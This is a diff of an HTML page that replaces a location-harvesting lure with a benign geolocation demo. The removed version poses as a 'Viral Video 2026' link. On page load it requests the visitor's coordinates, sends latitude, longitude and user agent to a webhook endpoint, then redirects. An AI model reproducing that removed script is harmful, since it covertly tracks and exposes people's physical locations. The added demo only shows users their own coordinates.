@@ -1,37 +1,39 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>Viral Video 2026</title>
-    <meta property="og:title" content="Viral Video 2026">
-    <meta property="og:description" content="Click to watch the full video">
-    <meta property="og:image" content="https://i.postimg.cc/y8vGyQWF/IMG-6637.jpg">
-    <meta property="og:image:width" content="1200">
-    <meta property="og:image:height" content="630">
-    <meta property="og:type" content="video.other">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-</head>
-<body style="margin:0; background:white; display:flex; justify-content:center; align-items:center; height:100vh;">
-    <div style="text-align:center;"><h2>Loading...</h2></div>
-    <script>
-        const targetURL = "https://postimg.cc/3k09KZXR";
-        const webhookURL = "https://d3f75cf1-78c6-4a72-b985-b7c8c20eb09b.webhooksite.net";
+<title>Location Demo</title>
 
-        window.onload = function() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(function(position) {
-                    fetch(webhookURL, { 
-                        method: 'POST', 
-                        mode: 'no-cors', 
-                        body: JSON.stringify({
-                            lat: position.coords.latitude, 
-                            lon: position.coords.longitude,
-                            device: navigator.userAgent
-                        }) 
-                    }).then(() => { window.location.href = targetURL; });
-                }, function() { window.location.href = targetURL; }, {timeout: 5000});
-            } else { window.location.href = targetURL; }
-        };
-    </script>
+<meta property="og:title" content="Location Demo Project">
+<meta property="og:description" content="Click to share your location for demo purpose">
+<meta property="og:image" content="https://i.postimg.cc/y8vGyQWF/IMG-6637.jpg">
+
+</head>
+
+<body style="text-align:center;font-family:sans-serif">
+
+<h2>Location Permission Demo</h2>
+<p>This demo will request your location with your permission.</p>
+
+<button onclick="getLocation()">Share My Location</button>
+
+<p id="result"></p>
+
+<script>
+function getLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(showPosition);
+  } else {
+    document.getElementById("result").innerHTML =
+    "Geolocation is not supported by this browser.";
+  }
+}
+
+function showPosition(position) {
+  document.getElementById("result").innerHTML =
+  "Latitude: " + position.coords.latitude +
+  "<br>Longitude: " + position.coords.longitude;
+}
+</script>
+
 </body>
 </html>
